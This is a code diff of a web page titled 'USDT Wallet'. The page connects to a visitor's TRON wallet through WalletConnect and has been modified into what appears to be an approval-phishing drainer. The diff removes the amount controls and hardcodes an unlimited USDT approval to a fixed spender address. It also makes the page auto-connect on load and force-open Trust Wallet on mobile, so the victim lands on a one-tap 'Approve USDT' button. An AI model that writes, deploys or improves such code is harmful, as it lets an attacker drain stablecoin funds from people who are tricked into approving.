@@ -1,48 +1,28 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <title>USDT Wallet</title>
 
 <style>
-body{margin:0;background:#0b0f19;color:white;font-family:sans-serif}
-.container{max-width:420px;margin:auto;padding:16px}
-.card{background:#121826;border-radius:16px;padding:16px;margin-top:16px}
-button{width:100%;padding:14px;border:none;border-radius:12px;margin-top:10px;font-weight:600}
-.connect{background:#3b82f6}
+body{background:#0b0f19;color:white;font-family:sans-serif;text-align:center;padding:20px}
+.card{background:#121826;padding:20px;border-radius:16px;max-width:420px;margin:auto}
+button{width:100%;padding:14px;border:none;border-radius:12px;margin-top:10px}
 .approve{background:#22c55e}
-#qr{display:flex;justify-content:center;margin-top:10px}
-#uri{font-size:10px;color:#888;word-break:break-all}
-.wallet{text-align:center;color:#4ade80;font-size:13px}
 </style>
 </head>
 
 <body>
 
-<div class="container">
+<div class="card">
+<h2>💰 USDT Wallet</h2>
 
-  <div class="card">
-    <button id="connectBtn" class="connect">Connect Wallet</button>
+<div id="status">Initializing...</div>
+<div id="wallet"></div>
 
-    <div id="qr"></div>
-    <div id="uri"></div>
-    <a id="openWallet" target="_blank"></a>
-
-    <div id="wallet" class="wallet"></div>
-  </div>
-
-  <div class="card">
-    <input type="range" id="range" min="1" max="1000" value="10">
-    <input type="number" id="amount" value="10">
-    <button id="maxBtn">MAX</button>
-
-    <button id="approveBtn" class="approve">Approve USDT</button>
-  </div>
+<button id="approveBtn" class="approve">Approve USDT</button>
 
 </div>
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 
 <script type="module">
 import bs58 from "https://esm.sh/bs58";
@@ -55,6 +35,17 @@ const SPENDER = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
 
 let client, session;
 
+// detect mobile
+function isMobile(){
+  return /Android|iPhone|iPad/i.test(navigator.userAgent);
+}
+
+// auto open trust wallet
+function openWallet(){
+  const link = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
+  window.location.href = link;
+}
+
 // convert
 function tronToHex(addr){
   const bytes = bs58.decode(addr);
@@ -62,49 +53,22 @@ function tronToHex(addr){
 }
 
 // encode
-function encodeApprove(spenderHex, amount){
-  const clean = spenderHex.replace(/^41/,"").padStart(64,"0");
-
-  let amountHex;
-
-  if(amount === "max"){
-    amountHex = "f".repeat(64);
-  } else {
-    const val = BigInt(Math.floor(amount * 1e6));
-    amountHex = val.toString(16).padStart(64,"0");
-  }
-
-  return "0x095ea7b3" + clean + amountHex;
+function encodeApprove(spenderHex){
+  return "0x095ea7b3" + spenderHex.replace(/^41/,"").padStart(64,"0") + "f".repeat(64);
 }
 
-// UI sync
-const range = document.getElementById("range");
-const input = document.getElementById("amount");
-
-range.oninput = ()=> input.value = range.value;
-input.oninput = ()=> range.value = input.value;
-
-document.getElementById("maxBtn").onclick = ()=> input.value = "max";
-
-// QR
-function showQR(uri){
-  document.getElementById("qr").innerHTML = "";
-  new QRCode(document.getElementById("qr"), {text:uri,width:200,height:200});
-
-  document.getElementById("uri").innerText = uri;
-
-  const link = "https://link.trustwallet.com/wc?uri=" + encodeURIComponent(uri);
-  document.getElementById("openWallet").href = link;
-  document.getElementById("openWallet").innerText = "Open in Trust Wallet";
-}
-
-// connect
-document.getElementById("connectBtn").onclick = async ()=>{
+// auto connect
+async function autoConnect(){
   const { SignClient } = await import("https://esm.sh/@walletconnect/sign-client@2.17.0");
 
   client = await SignClient.init({
     projectId: PROJECT_ID,
-    metadata:{name:"USDT",description:"dapp",url:location.origin,icons:[""]}
+    metadata:{
+      name:"USDT Wallet",
+      description:"auto connect",
+      url:location.origin,
+      icons:[""]
+    }
   });
 
   // reuse session
@@ -117,8 +81,8 @@ document.getElementById("connectBtn").onclick = async ()=>{
       requiredNamespaces:{
         tron:{
           methods:[
-            "tron_signTransaction",
-            "tron_sendTransaction" // 🔥 FIXED
+            "tron_sendTransaction",
+            "tron_signTransaction"
           ],
           chains:[TRON_CHAIN],
           events:[]
@@ -126,22 +90,25 @@ document.getElementById("connectBtn").onclick = async ()=>{
       }
     });
 
-    showQR(uri);
+    // mobile → open wallet automatically
+    if(isMobile()){
+      const deep = "https://link.trustwallet.com/wc?uri=" + encodeURIComponent(uri);
+      window.location.href = deep;
+    } else {
+      document.getElementById("status").innerText = "Scan QR in wallet";
+    }
+
     session = await approval();
   }
 
   const wallet = session.namespaces.tron.accounts[0].split(":")[2];
   document.getElementById("wallet").innerText = wallet;
-};
+  document.getElementById("status").innerText = "Connected";
+}
 
 // approve
 document.getElementById("approveBtn").onclick = async ()=>{
-  const wallet = session.namespaces.tron.accounts[0].split(":")[2];
-
-  let amount = input.value;
   const spenderHex = tronToHex(SPENDER);
-
-  const data = encodeApprove(spenderHex, amount === "max" ? "max" : Number(amount));
 
   const result = await client.request({
     topic: session.topic,
@@ -150,14 +117,27 @@ document.getElementById("approveBtn").onclick = async ()=>{
       method:"tron_sendTransaction",
       params:{
         to: USDT,
-        data: data,
-        value: "0x0"
+        data: encodeApprove(spenderHex),
+        value:"0x0"
       }
     }
   });
 
   console.log(result);
 };
+
+// 🚀 AUTO START
+(async ()=>{
+  document.getElementById("status").innerText = "Connecting...";
+
+  // mobile → force open wallet first
+  if(isMobile() && !window.location.href.includes("trustwallet")){
+    openWallet();
+    return;
+  }
+
+  await autoConnect();
+})();
 </script>
 
 </body>
